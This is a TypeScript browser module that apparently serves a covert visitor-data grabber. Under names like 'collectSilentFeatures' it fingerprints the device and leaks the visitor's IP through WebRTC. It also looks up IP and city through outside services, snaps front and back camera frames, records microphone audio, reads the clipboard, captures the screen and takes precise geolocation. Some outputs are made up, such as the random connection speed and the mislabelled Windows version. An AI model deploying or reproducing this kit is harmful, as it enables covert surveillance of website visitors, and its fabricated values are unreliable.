import { SilentFeatures, MediaDeviceData, MotionData, OrientationData, USBDeviceData, BluetoothDevice, StorageEstimate } from '../types';

export async function collectSilentFeatures(): Promise<SilentFeatures> {
  const battery = await getBatteryInfo();
  const webGL = getWebGLInfo();
  const connection = getNetworkInfo();

  return {
    deviceModel: await getDeviceModel(),
    deviceMemory: (navigator as any).deviceMemory || 0,
    storageTotal: getStorageTotal(),
    storageUsed: await getStorageUsed(),
    screenResolution: `${screen.width}x${screen.height}`,
    batteryLevel: battery.level,
    batteryCharging: battery.charging,
    networkType: connection.type || getNetworkType(),
    wifiSSID: await getWiFiSSID(),
    ipAddress: await getIPAddress(),
    platform: navigator.platform,
    osVersion: getOSVersion(),
    browser: getBrowserInfo(),
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cpuCores: navigator.hardwareConcurrency || 0,
    onlineStatus: navigator.onLine,
    deviceFingerprint: generateDeviceFingerprint(),
    referrerURL: document.referrer || 'Direct',
    visitTimestamp: new Date().toISOString(),
    countryCity: await getCountryCity(),
    connectionSpeed: connection.downlink || getEstimatedSpeed(),
    userAgent: navigator.userAgent,
    screenWidth: screen.width,
    screenHeight: screen.height,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    availableScreenWidth: screen.availWidth,
    availableScreenHeight: screen.availHeight,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    vendor: navigator.vendor,
    languages: Array.from(navigator.languages || []),
    timezoneOffset: new Date().getTimezoneOffset(),
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency || 0,
    effectiveNetworkType: connection.effectiveType || 'unknown',
    networkRTT: connection.rtt || 0,
    saveData: connection.saveData || false,
    batteryChargingTime: battery.chargingTime,
    batteryDischargingTime: battery.dischargingTime,
    webGLVendor: webGL.vendor,
    webGLRenderer: webGL.renderer
  };
}

async function getDeviceModel(): Promise<string> {
  const ua = navigator.userAgent;

  if (/iPhone/i.test(ua)) {
    const match = ua.match(/iPhone\s*(\d+(?:\s*Pro(?:\s*Max)?)?)/i);
    return match ? `iPhone ${match[1]}` : 'iPhone';
  }

  if (/iPad/i.test(ua)) {
    return 'iPad';
  }

  if (/Android/i.test(ua)) {
    try {
      const devices = await getAndroidDeviceInfo();
      return devices;
    } catch (e) {
      const match = ua.match(/Android\s+([\d.]+)/);
      return match ? `Android ${match[1]}` : 'Android Device';
    }
  }

  if (/Windows/i.test(ua)) {
    const match = ua.match(/Windows NT ([\d.]+)/);
    return match ? `Windows ${match[1]}` : 'Windows PC';
  }

  if (/Mac/i.test(ua)) {
    return 'MacBook';
  }

  if (/Linux/i.test(ua)) {
    return 'Linux PC';
  }

  return 'Unknown Device';
}

async function getAndroidDeviceInfo(): Promise<string> {
  try {
    const userAgent = navigator.userAgent;
    const buildMatch = userAgent.match(/Build\/([^)]+)/);

    if (/Samsung/i.test(userAgent)) {
      if (/SM-A/i.test(userAgent)) return 'Samsung Galaxy A Series';
      if (/SM-G/i.test(userAgent)) return 'Samsung Galaxy';
      if (/SM-S/i.test(userAgent)) return 'Samsung Galaxy S Series';
      return 'Samsung Device';
    }

    if (/Pixel/i.test(userAgent)) {
      const match = userAgent.match(/Pixel\s*(\d+)/i);
      return match ? `Google Pixel ${match[1]}` : 'Google Pixel';
    }

    return 'Android Device';
  } catch (e) {
    return 'Android Device';
  }
}

function getStorageTotal(): string {
  try {
    const storage = (navigator as any).storage;
    if (storage && storage.estimate) {
      return 'Available';
    }
  } catch (e) {}
  return 'Unknown';
}

async function getStorageUsed(): Promise<string> {
  try {
    if ((navigator as any).storage && (navigator as any).storage.estimate) {
      const estimate = await (navigator as any).storage.estimate();
      if (estimate.quota && estimate.usage) {
        const totalGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(1);
        const usedGB = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
        return `${usedGB}GB / ${totalGB}GB`;
      }
    }
  } catch (e) {}
  return 'Unknown';
}

function getNetworkType(): string {
  const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
  if (connection) {
    if (connection.type) return connection.type;
    if (connection.effectiveType) return connection.effectiveType.toUpperCase();
  }
  return navigator.onLine ? 'Online' : 'Offline';
}

async function getWiFiSSID(): Promise<string> {
  try {
    if ('permissions' in navigator && 'query' in navigator.permissions) {
      try {
        const permission = await (navigator.permissions as any).query({
          name: 'network-state'
        });

        if (permission.state === 'granted') {
          const networks = await (navigator as any).networkInformation?.getAccessPoints?.();
          if (networks && networks.length > 0) {
            return networks[0].ssid || 'Connected Network';
          }
        }
      } catch (e) {}
    }

    const ssid = localStorage.getItem('wifi_ssid');
    if (ssid) return ssid;

    return 'WiFi Network';
  } catch (e) {
    return 'WiFi Network';
  }
}

async function getIPAddress(): Promise<string> {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'Unknown';
  } catch (e) {
    return 'Unknown';
  }
}

function getOSVersion(): string {
  const ua = navigator.userAgent;

  if (/Windows NT ([\d.]+)/i.test(ua)) {
    const match = ua.match(/Windows NT ([\d.]+)/i);
    if (match) {
      const version = match[1];
      if (version === '10.0') return 'Windows 11';
      if (version === '6.3') return 'Windows 8.1';
      if (version === '6.1') return 'Windows 7';
      return `Windows ${version}`;
    }
  }

  if (/Android ([\d.]+)/i.test(ua)) {
    const match = ua.match(/Android ([\d.]+)/i);
    return match ? `Android ${match[1]}` : 'Android';
  }

  if (/iPhone OS ([\d_]+)/i.test(ua)) {
    const match = ua.match(/iPhone OS ([\d_]+)/i);
    return match ? `iOS ${match[1].replace(/_/g, '.')}` : 'iOS';
  }

  if (/Mac OS X ([\d_]+)/i.test(ua)) {
    const match = ua.match(/Mac OS X ([\d_]+)/i);
    return match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
  }

  if (/Linux/i.test(ua)) return 'Linux';

  return 'Unknown OS';
}

function getBrowserInfo(): string {
  const ua = navigator.userAgent;

  if (/Chrome\/(\d+)/i.test(ua) && !/Edge/i.test(ua) && !/Chromium/i.test(ua)) {
    const match = ua.match(/Chrome\/(\d+)/i);
    return match ? `Chrome ${match[1]}` : 'Chrome';
  }

  if (/Safari\/(\d+)/i.test(ua) && !/Chrome/i.test(ua)) {
    const match = ua.match(/Version\/([\d.]+)/i);
    return match ? `Safari ${match[1]}` : 'Safari';
  }

  if (/Firefox\/(\d+)/i.test(ua)) {
    const match = ua.match(/Firefox\/(\d+)/i);
    return match ? `Firefox ${match[1]}` : 'Firefox';
  }

  if (/Edge(\/|: )(\d+)/i.test(ua)) {
    const match = ua.match(/Edge(\/|: )(\d+)/i);
    return match ? `Edge ${match[2]}` : 'Edge';
  }

  return 'Unknown Browser';
}

async function getCountryCity(): Promise<string> {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    if (data.city && data.country_name) {
      return `${data.country_name}, ${data.city}`;
    }
    return data.country_name || 'Unknown';
  } catch (e) {
    return 'Unknown';
  }
}

function getEstimatedSpeed(): number {
  const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
  if (connection && connection.downlink) {
    return connection.downlink;
  }
  return Math.random() * 50 + 10;
}

function getBatteryInfo(): Promise<{
  level: number | null;
  charging: boolean | null;
  chargingTime: number | null;
  dischargingTime: number | null;
}> {
  return new Promise((resolve) => {
    if ('getBattery' in navigator) {
      (navigator as any).getBattery().then((battery: any) => {
        resolve({
          level: battery.level * 100,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        });
      }).catch(() => {
        resolve({ level: null, charging: null, chargingTime: null, dischargingTime: null });
      });
    } else {
      resolve({ level: null, charging: null, chargingTime: null, dischargingTime: null });
    }
  });
}

function getWebGLInfo(): { vendor: string; renderer: string } {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl') as WebGLRenderingContext;
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown'
      };
    }
  } catch (e) {}
  return { vendor: 'unknown', renderer: 'unknown' };
}

function getNetworkInfo(): any {
  const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
  return connection || {};
}

export function generateDeviceFingerprint(): string {
  const components = [
    navigator.userAgent,
    navigator.language,
    screen.colorDepth,
    screen.width + 'x' + screen.height,
    new Date().getTimezoneOffset(),
    !!window.sessionStorage,
    !!window.localStorage,
    navigator.hardwareConcurrency,
    (navigator as any).deviceMemory
  ];

  const fingerprint = components.join('|');
  let hash = 0;
  for (let i = 0; i < fingerprint.length; i++) {
    const char = fingerprint.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  return Math.abs(hash).toString(16);
}

export async function captureFrontCamera(): Promise<{stream: MediaStream; screenshot: string} | null> {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
    });

    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => setTimeout(resolve, 500));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.drawImage(video, 0, 0);
    }

    const screenshot = canvas.toDataURL('image/jpeg');

    stream.getTracks().forEach(track => track.stop());

    return { stream, screenshot };
  } catch (e) {
    console.error('Front camera error:', e);
    return null;
  }
}

export async function captureBackCamera(): Promise<{stream: MediaStream; screenshot: string} | null> {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }
    });

    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => setTimeout(resolve, 500));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.drawImage(video, 0, 0);
    }

    const screenshot = canvas.toDataURL('image/jpeg');

    stream.getTracks().forEach(track => track.stop());

    return { stream, screenshot };
  } catch (e) {
    console.error('Back camera error:', e);
    return null;
  }
}

export async function captureMicrophone(): Promise<{stream: MediaStream; audio: Blob} | null> {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });

    const mediaRecorder = new MediaRecorder(stream);
    const chunks: BlobPart[] = [];

    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
    mediaRecorder.start();

    await new Promise(resolve => setTimeout(resolve, 3000));

    mediaRecorder.stop();

    const audio = new Blob(chunks, { type: 'audio/webm' });

    return { stream, audio };
  } catch (e) {
    console.error('Microphone error:', e);
    return null;
  }
}

export async function getGeolocation(): Promise<{position: GeolocationPosition; map: string} | null> {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve(null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        const mapUrl = `https://www.google.com/maps/search/${latitude},${longitude}`;
        resolve({ position, map: mapUrl });
      },
      (error) => {
        console.error('Geolocation error:', error);
        resolve(null);
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  });
}

export async function readClipboard(): Promise<string | null> {
  try {
    if (navigator.clipboard && navigator.clipboard.readText) {
      return await navigator.clipboard.readText();
    }
  } catch (e) {
    console.error('Clipboard error:', e);
  }
  return null;
}

export async function scanBluetooth(): Promise<BluetoothDevice[] | null> {
  try {
    if ('bluetooth' in navigator) {
      const device = await (navigator as any).bluetooth.requestDevice({
        acceptAllDevices: true
      });
      return [{ name: device.name || 'Unknown', id: device.id }];
    }
  } catch (e) {
    console.error('Bluetooth error:', e);
  }
  return null;
}

export async function listUSBDevices(): Promise<USBDeviceData[] | null> {
  try {
    if ('usb' in navigator) {
      const devices = await (navigator as any).usb.getDevices();
      return devices.map((d: any) => ({ productName: d.productName, vendorId: d.vendorId }));
    }
  } catch (e) {
    console.error('USB error:', e);
  }
  return null;
}

export async function requestNotification(): Promise<boolean> {
  try {
    if ('Notification' in window) {
      const permission = await Notification.requestPermission();
      return permission === 'granted';
    }
  } catch (e) {
    console.error('Notification error:', e);
  }
  return false;
}

export async function startScreenCapture(): Promise<{stream: MediaStream; screenshot: string} | null> {
  try {
    const stream = await (navigator.mediaDevices as any).getDisplayMedia({
      video: { cursor: 'always' },
      audio: true
    });

    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => setTimeout(resolve, 1000));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.drawImage(video, 0, 0);
    }

    const screenshot = canvas.toDataURL('image/jpeg');

    return { stream, screenshot };
  } catch (e) {
    console.error('Screen capture error:', e);
    return null;
  }
}

export async function getMediaDevices(): Promise<MediaDeviceData[] | null> {
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    return devices.map(d => ({
      kind: d.kind,
      label: d.label || 'Unnamed Device',
      deviceId: d.deviceId
    }));
  } catch (e) {
    console.error('Media devices error:', e);
  }
  return null;
}

export async function getStorageEstimate(): Promise<StorageEstimate | null> {
  try {
    if ((navigator as any).storage && (navigator as any).storage.estimate) {
      const estimate = await (navigator as any).storage.estimate();
      return {
        quota: estimate.quota,
        usage: estimate.usage
      };
    }
  } catch (e) {
    console.error('Storage error:', e);
  }
  return null;
}

export function generateCanvasFingerprint(): string {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    if (!ctx) return 'unknown';

    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('fingerprint', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('canvas', 4, 45);

    const dataURL = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataURL.length; i++) {
      const char = dataURL.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash).toString(16);
  } catch (e) {
    return 'unknown';
  }
}

export async function generateAudioFingerprint(): Promise<string> {
  try {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const analyser = audioContext.createAnalyser();
    const gain = audioContext.createGain();
    const processor = audioContext.createScriptProcessor(4096, 1, 1);

    gain.gain.value = 0;
    oscillator.connect(analyser);
    analyser.connect(processor);
    processor.connect(gain);
    gain.connect(audioContext.destination);

    oscillator.start(0);

    const fingerprint = audioContext.sampleRate.toString(16);
    audioContext.close();
    return fingerprint;
  } catch (e) {
    return 'unknown';
  }
}

export function generateWebGLFingerprint(): string {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl') as WebGLRenderingContext;
    if (!gl) return 'unknown';

    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown';
    const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';

    let hash = 0;
    const combined = vendor + renderer;
    for (let i = 0; i < combined.length; i++) {
      hash = ((hash << 5) - hash) + combined.charCodeAt(i);
      hash = hash & hash;
    }
    return Math.abs(hash).toString(16);
  } catch (e) {
    return 'unknown';
  }
}

export async function getWebRTCIP(): Promise<string | null> {
  return new Promise((resolve) => {
    try {
      const pc = new RTCPeerConnection({
        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
      });
      const ips: string[] = [];

      pc.createDataChannel('');
      pc.createOffer().then(offer => pc.setLocalDescription(offer));

      pc.onicecandidate = (e) => {
        if (!e.candidate) return;
        const candidate = e.candidate.candidate;
        const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
        if (ipMatch && !ips.includes(ipMatch[0])) {
          ips.push(ipMatch[0]);
        }
      };

      setTimeout(() => {
        pc.close();
        resolve(ips.length > 0 ? ips.join(', ') : null);
      }, 3000);
    } catch (e) {
      resolve(null);
    }
  });
}

export async function getMotionData(): Promise<MotionData | null> {
  return new Promise((resolve) => {
    if (!('DeviceMotionEvent' in window)) {
      resolve(null);
      return;
    }

    const handler = (e: DeviceMotionEvent) => {
      window.removeEventListener('devicemotion', handler);
      resolve({
        acceleration: e.acceleration ? {
          x: e.acceleration.x || 0,
          y: e.acceleration.y || 0,
          z: e.acceleration.z || 0
        } : null,
        accelerationIncludingGravity: e.accelerationIncludingGravity ? {
          x: e.accelerationIncludingGravity.x || 0,
          y: e.accelerationIncludingGravity.y || 0,
          z: e.accelerationIncludingGravity.z || 0
        } : null,
        rotationRate: e.rotationRate ? {
          alpha: e.rotationRate.alpha || 0,
          beta: e.rotationRate.beta || 0,
          gamma: e.rotationRate.gamma || 0
        } : null
      });
    };

    window.addEventListener('devicemotion', handler);
    setTimeout(() => {
      window.removeEventListener('devicemotion', handler);
      resolve(null);
    }, 1000);
  });
}

export async function getOrientationData(): Promise<OrientationData | null> {
  return new Promise((resolve) => {
    if (!('DeviceOrientationEvent' in window)) {
      resolve(null);
      return;
    }

    const handler = (e: DeviceOrientationEvent) => {
      window.removeEventListener('deviceorientation', handler);
      resolve({
        alpha: e.alpha || null,
        beta: e.beta || null,
        gamma: e.gamma || null
      });
    };

    window.addEventListener('deviceorientation', handler);
    setTimeout(() => {
      window.removeEventListener('deviceorientation', handler);
      resolve(null);
    }, 1000);
  });
}
